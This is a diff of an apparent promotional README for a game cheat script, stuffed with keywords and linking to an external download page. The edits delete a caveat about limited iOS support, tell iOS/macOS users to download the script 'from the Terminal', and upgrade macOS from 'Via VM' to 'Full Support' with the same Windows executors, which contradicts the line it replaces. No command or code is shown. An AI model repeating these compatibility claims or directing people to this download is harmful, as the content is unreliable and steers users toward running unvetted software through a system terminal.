@@ -169,10 +169,8 @@ The **best combat arena script** community consistently ranks our tool as the mo
 
 2. **Import and Execute**
    - Follow similar steps to Android/Windows installation
-   - Download iOS/MacOS compatible **combat arena script keyless** version
+   - Download iOS/MacOS compatible **combat arena script keyless** version from the Terminal
    - Execute after spawning in-game
-
-**Note:** iOS support is limited compared to PC and Android due to platform restrictions. Some advanced features may have reduced functionality.
 
 [![Download Combat Arena Script](https://img.shields.io/badge/Download%20Combat%20Arena%20Script-brightgreen?style=for-the-badge&logo=github)](https://combatarenascrps.github.io/combat-arena/)
 
@@ -196,7 +194,7 @@ For the **best combat arena script** experience:
 | Windows 10/11 | ✅ Full Support | Synapse X, KRNL, Fluxus, Script-Ware, Electron, Delta | All features unlocked |
 | Android 9.0+ | ✅ Full Support | Arceus X, Fluxus Mobile, Delta Mobile, Hydrogen | Touch-optimized interface |
 | iOS 14+ | ⚠️ Limited | Scriptable (jailbreak required) | Core features available |
-| macOS | ⚠️ Via VM | Wine/Parallels executors | Performance varies |
+| macOS | ✅ Full Support | Synapse X, KRNL, Fluxus, Script-Ware, Electron, Delta | All features unlocked |
 | Linux | ⚠️ Via VM | Wine compatibility layer | Community support |
 | ChromeOS | ❌ Not Supported | N/A | Technical limitations |
 
